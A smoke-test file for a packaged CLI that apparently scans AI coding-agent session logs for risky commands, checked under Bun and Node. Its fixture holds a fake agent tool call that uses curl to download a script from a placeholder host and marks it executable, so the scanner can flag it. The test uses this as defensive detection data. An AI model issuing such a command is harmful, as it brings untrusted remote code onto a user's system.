// Packaging smoke test (ADR 0010): builds dist/cli.mjs, runs it as a child process under Node and Bun. Defanged data only.
import { afterAll, describe, expect, test, setDefaultTimeout } from "bun:test";
// These tests start real processes, which take ~2 s each on slow, security-scanned Windows machines; 5 s is too tight.
setDefaultTimeout(60_000);
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const root = join(import.meta.dir, "..");
const CLI = join(root, "dist", "cli.mjs");
const base = mkdtempSync(join(tmpdir(), "rh-smoke-"));
afterAll(() => rmSync(base, { recursive: true, force: true }));

const build = Bun.spawnSync([process.execPath, "scripts/build.mjs"], { cwd: root });
if (build.exitCode !== 0) throw new Error(`build failed: ${build.stderr}`);

const claude = join(base, "claude");
mkdirSync(join(claude, "projects", "-home-x-acme"), { recursive: true });
writeFileSync(join(claude, "projects", "-home-x-acme", "s1.jsonl"), JSON.stringify({
  type: "assistant", uuid: "u-1", sessionId: "s1", timestamp: "2026-11-07T10:00:00.000Z", cwd: "/home/x/acme",
  message: { content: [{ type: "tool_use", id: "t1", name: "Bash", input: { command: "curl https://example.invalid/x.sh -o x && chmod +x x" } }] },
}) + "\n");

const node = Bun.spawnSync(["node", "--version"]);
const nodeVer = node.exitCode === 0 ? node.stdout.toString().trim().slice(1).split(".").map(Number) : [0, 0];
const nodeOk = (nodeVer[0]! > 22) || (nodeVer[0] === 22 && nodeVer[1]! >= 13); // engines, ADR 0001

const runtimes: [string, string][] = [["bun", process.execPath]];
if (nodeOk) runtimes.push(["node", "node"]);
else console.warn("smoke: node >= 22.13 not found on PATH, skipping the Node half");

describe.each(runtimes)("dist/cli.mjs under %s", (name, exe) => {
  const sh = (...args: string[]) => {
    const r = Bun.spawnSync([exe, CLI, ...args], { cwd: base });
    return { code: r.exitCode, out: r.stdout.toString(), err: r.stderr.toString() };
  };

  test("--version and --help", () => {
    expect(sh("--version")).toMatchObject({ code: 0, out: `${JSON.parse(readFileSync(join(root, "package.json"), "utf8")).version}\n`, err: "" });
    const help = sh("--help");
    expect(help.out).toContain("scan");
    expect(help.err).not.toContain("ExperimentalWarning");
  });

  test("scan, store, findings from a directory that is not the repo root", () => {
    const db = join(base, `${name}.db`);
    const flags = ["--root", claude, "--db", db, "--format", "json"];
    const scan = sh("scan", ...flags);
    expect({ code: scan.code, err: scan.code ? scan.err : "" }).toEqual({ code: 0, err: "" }); // a failure shows its stderr
    expect(scan.err).not.toContain("ExperimentalWarning"); // the store opened node:sqlite (or bun:sqlite) on this run
    const report = JSON.parse(scan.out);
    expect(report.scan.sessions).toBe(1);
    expect(report.findings.map((f: { rule_id: string }) => f.rule_id)).toContain("55e00e15-4d61-44ae-9d33-968e6df3adca");
    const q = sh("query", "select count(*) as n from findings", "--db", db, "--format", "json");
    expect(q.code).toBe(0);
    expect(q.out).toMatch(/"n":\s*[1-9]/);
  });
});

// Node 22.13 to 24.14 emit the SQLite ExperimentalWarning; only Node >= 24.15 is clean on its own, so run the bundle's
// banner against both a SQLite and a foreign warning to prove it filters the first and nothing else.
test.skipIf(!nodeOk)("banner drops only the SQLite ExperimentalWarning", () => {
  const banner = readFileSync(CLI, "utf8").split("\n").find((l) => l.startsWith("/*rh-warn*/"))!;
  expect(banner).toBeDefined();
  const script = `${banner}
process.emitWarning("SQLite is an experimental feature and might change at any time", "ExperimentalWarning");
process.emitWarning("Ed25519 is experimental", "ExperimentalWarning");
process.emitWarning("other thing", "DeprecationWarning");`;
  const r = Bun.spawnSync(["node", "-e", script]);
  const err = r.stderr.toString();
  expect(err).not.toContain("SQLite is an experimental");
  expect(err).toContain("Ed25519 is experimental");
  expect(err).toContain("other thing");
});

test("package.json ships no runtime dependencies and no install scripts", () => {
  const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
  expect(pkg.dependencies).toBeUndefined();
  for (const s of ["preinstall", "install", "postinstall"]) expect(pkg.scripts?.[s]).toBeUndefined();
  expect(pkg.bin).toEqual({ retrohound: "dist/cli.mjs" });
});

test("licences ship: Apache-2.0 code, DRL rules, and the bundled packages' licences (ADR 0010)", () => {
  const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
  expect(pkg.license).toBe("Apache-2.0");
  expect(pkg.files).toEqual(expect.arrayContaining(["NOTICE", "rules/LICENSE", "dist/THIRD_PARTY_LICENSES"]));
  expect(readFileSync(join(root, "LICENSE"), "utf8")).toMatch(/Apache License\s+Version 2\.0, January 2004/);
  expect(readFileSync(join(root, "rules", "LICENSE"), "utf8")).toContain("Detection Rule License (DRL) 1.1");
  const third = readFileSync(join(root, "dist", "THIRD_PARTY_LICENSES"), "utf8");
  for (const dep of ["commander@", "picocolors@", "yaml@"]) expect(third).toContain(dep);
});
